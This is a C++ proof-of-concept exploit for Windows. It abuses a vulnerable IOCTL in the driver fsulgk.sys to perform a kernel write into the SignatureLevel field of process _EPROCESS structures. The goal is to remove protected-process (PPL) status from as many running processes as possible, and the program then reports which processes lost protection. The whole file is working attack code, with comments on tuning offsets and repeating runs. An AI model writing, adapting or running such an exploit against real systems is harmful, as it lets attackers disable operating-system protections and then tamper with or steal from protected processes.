#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <TlHelp32.h>
#include <string>

#pragma comment( lib, "ntdll.lib" )

//Update this offset to offset of SignatureLevel (it is member of _EPROCESS), it can be vary on diffrent windows versions
const UINT64 SignatureLevel_offset = 0x878;

struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID Object;
	ULONG UniqueProcessId;
	ULONG HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
};

struct SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG NumberOfHandles;
	ULONG Reserved;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
};

//Returns protected processes, std::pair<Pid, ProcessName> 
std::vector<std::pair<DWORD, std::string>> GetProtectedProcesses()
{
	std::vector<std::pair<DWORD, std::string>> Result;

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			HANDLE Process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, entry.th32ProcessID);
			if (Process)
			{
				BYTE Protection = 0;
				NTSTATUS Status = NtQueryInformationProcess(Process, (PROCESSINFOCLASS)61 /*ProcessProtectionInformation*/, &Protection, 1, 0);
				//If process is protected
				if (Protection && NT_SUCCESS(Status))
				{
					Result.push_back(std::pair<DWORD, std::string>(entry.th32ProcessID, std::string(entry.szExeFile)));
				}
				CloseHandle(Process);
			}
		}
	}

	CloseHandle(snapshot);
	return Result;
}

//Filters processes to find processes which are not protected now (It is used after executing exploit)
std::vector<std::pair<DWORD, std::string>> CheckIfProcessesAreStillProtected(const std::vector<std::pair<DWORD, std::string>>& Processes)
{
	std::vector<std::pair<DWORD, std::string>> Result;
	for (int i = 0; i < Processes.size(); i++)
	{
		HANDLE Process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, Processes[i].first);
		if (Process)
		{
			BYTE Protection = 0;
			NTSTATUS Status = NtQueryInformationProcess(Process, (PROCESSINFOCLASS)61 /*ProcessProtectionInformation*/, &Protection, 1, 0);
			//If process is not protected
			if (!Protection && NT_SUCCESS(Status))
			{
				Result.push_back(std::pair<DWORD, std::string>(Processes[i].first, Processes[i].second));
			}
			CloseHandle(Process);
		}
	}
	return Result;
}

void Exploit(HANDLE DeviceHandle, BYTE* InputBuffer, UINT64 SizeOfInputBuffer, std::wstring& PathToTempFile)
{
	ULONG uLength = 0x600000 * (sizeof(SYSTEM_HANDLE_INFORMATION_EX) + sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

	PVOID Buffer = VirtualAlloc(nullptr, uLength, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (!Buffer)
	{
		std::cout << "Couldn't allocate buffer for SystemInformation :(\n";
		return;
	}

	ZeroMemory(Buffer, uLength);

	ULONG CorrectSize = 0;
	NTSTATUS Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x40, //SystemExtendedHandleInformation
		Buffer, uLength, &CorrectSize);

	if (!NT_SUCCESS(Status))
	{
		std::cout << "NtQuerySystemInformation didn't return STATUS_SUCCESS :(\n";
		return;
	}

	SYSTEM_HANDLE_INFORMATION_EX* HandleInformation = (SYSTEM_HANDLE_INFORMATION_EX*)(Buffer);

	for (UINT i = 0; i < HandleInformation->NumberOfHandles; i++)
	{
		if (HandleInformation->Handles[i].HandleAttributes == 0x102A /*SystemKProcessHandleAttributes*/)
		{
			/*
				My exploit creates temporary file, because it need to pass path of that file to fsulgk.sys,
				if my exploit wasn't do that then it would write other return values, but to make my exploit work
				it has to return 0 to output buffer which indicates STATUS_SUCCESS
			*/
			HANDLE TempFile = CreateFileW(PathToTempFile.c_str(), GENERIC_READ, 0, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
			CloseHandle(TempFile);

			//Call vulnerable function in fsulgk.sys
			DeviceIoControl(DeviceHandle, 0xC5EAF99B, InputBuffer, SizeOfInputBuffer, (LPVOID)((UINT64)HandleInformation->Handles[i].Object + SignatureLevel_offset), 4, 0, 0);
		}
	}

	VirtualFree(Buffer, 0, MEM_RELEASE);
}

int main()
{
	HANDLE DeviceHandle = CreateFileW(L"\\\\.\\FSUlGatekeeperDev", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	std::cout << "Handle: 0x" << std::hex << DeviceHandle << "\n";
	if (DeviceHandle == INVALID_HANDLE_VALUE)
	{
		std::cout << "Couldn't get DeviceHandle :(\nTry to run this exploit with administrator rights\nPress any button to exit...";
		std::getchar();
		return 1;
	}

	wchar_t CurrentDir[MAX_PATH];
	GetCurrentDirectoryW(MAX_PATH, CurrentDir);
	//Temporary file is needed for DeviceIoControl, without that file, it wouldn't return STATUSS_SUCCESS (That file is later created in Exploit())
	std::wstring Path = std::wstring(L"\\??\\") + CurrentDir + L"\\Test.txt";
	std::wcout << L"Path to temp file: " << Path << L"\n";

	//Setup Input buffer
	BYTE* InputBuffer = new BYTE[0x80];
	ZeroMemory(InputBuffer, 0x80);
	*(DWORD*)InputBuffer = 2;
	//Copy path to temporary file to input buffer
	memcpy(InputBuffer + 4, Path.c_str(), Path.size() * sizeof(wchar_t) + sizeof(wchar_t));
	std::cout << "Input buffer address: 0x" << std::hex << (UINT64)InputBuffer << "\n";


	//std::pair<Pid, ProcessName>
	std::vector<std::pair<DWORD, std::string>> ProtectedProcesses = GetProtectedProcesses();

	std::cout << "Executing exploit... (It may take up to 10s)\n";
	/*
		I execute exploit in a loop because, when it finds some random _EPROCESS address, i don't know to which process it belongs,
		but i want to disable Protection in as many processes i can, so i loop at as many _EPROCESS structures i can. If it
		doesn't disable Protection for all processes, run this exploit again or run Exploit() function more times (you can just
		change condition in this for loop)
	*/
	for (int i = 0; i < 0x40; i++)
		Exploit(DeviceHandle, InputBuffer, 0x80, Path);

	//Get processes which are not protected now
	std::vector<std::pair<DWORD, std::string>> ProcessesWhichAreNotProtectedNow = CheckIfProcessesAreStillProtected(ProtectedProcesses);

	std::cout << "\nProcesses which were protected, but are not protected now:\n" << std::dec;
	for (int i = 0; i < ProcessesWhichAreNotProtectedNow.size(); i++)
	{
		std::cout << ProcessesWhichAreNotProtectedNow[i].second << "\t\tPid: " << ProcessesWhichAreNotProtectedNow[i].first << "\n";
	}
	std::cout << "\nPress any button to exit...\n";
	std::getchar();
}